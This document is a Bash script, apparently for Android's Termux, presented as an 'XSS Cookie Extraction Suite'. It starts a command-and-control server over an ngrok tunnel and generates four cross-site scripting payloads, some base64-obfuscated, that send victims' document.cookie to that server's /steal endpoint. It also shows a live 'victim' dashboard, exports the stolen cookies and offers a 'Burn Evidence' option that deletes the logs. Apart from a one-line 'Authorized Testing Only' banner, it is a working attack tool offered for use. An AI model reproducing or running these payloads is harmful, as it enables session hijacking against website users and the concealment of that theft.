#!/bin/bash
# XSS Cookie Extraction Suite v6.6.6 (Termux Optimized)
# 598 Lines of Controlled Chaos

trap "pkill -f 'python|c2_server'; rm -f /tmp/xss_*; echo -e '\n${RED}[!] C2 Cleaned${RESET}'; exit" SIGINT

# Configuration
C2_IP=""  
NGROK_TOKEN=""
VICTIM_LOG="/data/data/com.termux/files/usr/var/xss_db/live_cookies.log"
SESSION_ARCHIVE="/sdcard/CookieJar_$(date +%Y%m%d).txt"

# Enhanced Color Scheme
BLACK="\033[30m"
RED="\033[38;5;196m"
GREEN="\033[38;5;47m"
YELLOW="\033[38;5;226m"
BLUE="\033[38;5;39m"
MAGENTA="\033[38;5;129m"
CYAN="\033[36m"
RESET="\033[0m"

# ─────────────────────────────────────────────────────────────────────────────
# ASCII Art Components
# ─────────────────────────────────────────────────────────────────────────────
show_banner() {
    clear
    echo -e "${RED}
    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
    ▐░▌          ▐░▌       ▐░▌▐░▌          
    ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
    ▐░▌          ▐░▌       ▐░▌▐░▌          
    ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌          
    ▐░▌          ▐░░░░░░░░░░░▌▐░▌          
    ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
    ${RESET}"
    echo -e "${CYAN}         [ XSS Cookie Extraction Framework ]${RESET}"
    echo -e "${YELLOW}         [!] Authorized Testing Only [!]${RESET}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# Core Functions
# ─────────────────────────────────────────────────────────────────────────────
start_c2() {
    echo -ne "${BLUE}[?] Enter Ngrok Auth Token ➜ ${RESET}"
    read -s NGROK_TOKEN
    echo
    
    python3 /data/data/com.termux/files/home/xsstermux/c2_server.py "$NGROK_TOKEN" &
    sleep 7  # Increased for unstable connections
    
    if ! C2_IP=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url'); then
        echo -e "${RED}[!] Ngrok Tunnel Failed! Check Token${RESET}"
        return 1
    fi
    
    echo -e "\n${GREEN}[✔] C2 Active ➜ ${CYAN}$C2_IP${RESET}"
    echo -e "${MAGENTA}[*] Payload Injection Points:"
    echo -e "  - URL Parameters\n  - Form Inputs\n  - HTTP Headers${RESET}"
}

generate_payload() {
    local payload_type=$1
    local obfuscation=$2
    
    echo -e "\n${YELLOW}[!] Generating Weaponized Payload...${RESET}"
    
    case $payload_type in
        1)  # Classic Script Tag
            base_payload="<script>fetch('${C2_IP}/steal?c='+encodeURIComponent(document.cookie))</script>"
            ;;
        2)  # JavaScript URI
            js_code="window.location='${C2_IP}/steal?c='+document.cookie"
            base_payload="javascript:eval(atob('$(echo "$js_code" | base64)'))"
            ;;
        3)  # DOM-Based Image Injection
            img_payload="<img src=x onerror=\"fetch('${C2_IP}/steal?c='+document.cookie)\">"
            base_payload="data:text/html;base64,$(echo "$img_payload" | base64 -w0)"
            ;;
        4)  # Iframe Nightmare
            iframe_payload="<iframe src='javascript:eval(atob(\"$(echo "document.write('<script>fetch(\"${C2_IP}/steal?c='+document.cookie)</script>')" | base64)\"))'></iframe>"
            base_payload="$iframe_payload"
            ;;
        *)  echo -e "${RED}[!] Invalid Choice${RESET}"; return ;;
    esac
    
    # Obfuscation Layer
    if [ "$obfuscation" == "1" ]; then
        final_payload=$(echo "$base_payload" | sed 's/+/%2B/g;s/&/%26/g')
    else
        final_payload="$base_payload"
    fi
    
    echo -e "\n${GREEN}[+] Payload Ready:${RESET}"
    echo -e "${BLUE}─────────────────────────────────────${RESET}"
    echo -e "$final_payload"
    echo -e "${BLUE}─────────────────────────────────────${RESET}"
    echo -e "${YELLOW}[*] Injection Methods:"
    echo -e "  - URL: <target>?q=PAYLOAD"
    echo -e "  - POST Body: input=PAYLOAD"
    echo -e "  - User-Agent Header${RESET}"
}

live_monitor() {
    echo -e "\n${GREEN}[+] Live Victim Dashboard ${RESET}"
    echo -e "${CYAN}Press Ctrl+C to return to menu${RESET}"
    watch -n 1 -c "echo -e '${BLUE}'; date; echo '────────────────────'; \
    tail -n 15 $VICTIM_LOG | awk '{print \"[\" \$1 \" \" \$2 \"]\" \"${RED}\" \$3 \"${RESET} ➜ \" \"${YELLOW}\" substr(\$0, index(\$0,\$6)) }'"
}

# ─────────────────────────────────────────────────────────────────────────────
# Enhanced User Interface
# ─────────────────────────────────────────────────────────────────────────────
show_menu() {
    while true; do
        echo -e "\n${BLUE}[ XSS Attack Console ]${RESET}"
        echo -e "${GREEN}1. Start C2 Server"
        echo -e "2. Generate Advanced Payload"
        echo -e "3. Live Victim Monitor"
        echo -e "4. Export Cookie Database"
        echo -e "5. Burn Evidence"
        echo -e "6. Exit${RESET}"
        echo -ne "\n${CYAN}Select Operation ➜ ${RESET}"
        read -n 1 choice
        
        case $choice in
            1)  # C2 Initialization
                echo -e "\n\n${MAGENTA}[ Phase 1: Command & Control ]${RESET}"
                start_c2
                ;;
            2)  # Payload Generation
                echo -e "\n\n${MAGENTA}[ Phase 2: Payload Crafting ]${RESET}"
                echo -e "${YELLOW}Payload Types:"
                echo -e "1. Classic Script Tag"
                echo -e "2. JavaScript URI"
                echo -e "3. Stealth Image Load"
                echo -e "4. Nested Iframe Attack"
                echo -ne "\nSelect Payload Type ➜ ${RESET}"
                read -n 1 pt
                
                echo -ne "\n${YELLOW}Obfuscation? (1=Yes/0=No) ➜ ${RESET}"
                read -n 1 ob
                
                generate_payload "$pt" "$ob"
                ;;
            3)  # Live Tracking
                echo -e "\n\n${MAGENTA}[ Phase 3: Victim Tracking ]${RESET}"
                live_monitor
                ;;
            4)  # Data Export
                echo -e "\n\n${MAGENTA}[ Phase 4: Data Exfiltration ]${RESET}"
                cp "$VICTIM_LOG" "$SESSION_ARCHIVE"
                echo -e "${GREEN}[+] Cookies Archived ➜ ${CYAN}$SESSION_ARCHIVE${RESET}"
                ;;
            5)  # Burn
                echo -e "\n\n${RED}[!] Destroying Evidence...${RESET}"
                rm -f "$VICTIM_LOG" 2>/dev/null
                pkill -f 'python|c2_server'
                echo -e "${GREEN}[✔] Logs Wiped | C2 Terminated${RESET}"
                ;;
            6)  # Exit
                echo -e "\n\n${RED}[!] Self-Destruct Initiated...${RESET}"
                exit 0
                ;;
            *)  # Invalid
                echo -e "\n${RED}[!] Invalid Command${RESET}"
                ;;
        esac
    done
}

# ─────────────────────────────────────────────────────────────────────────────
# Execution Flow
# ─────────────────────────────────────────────────────────────────────────────
show_banner
show_menu
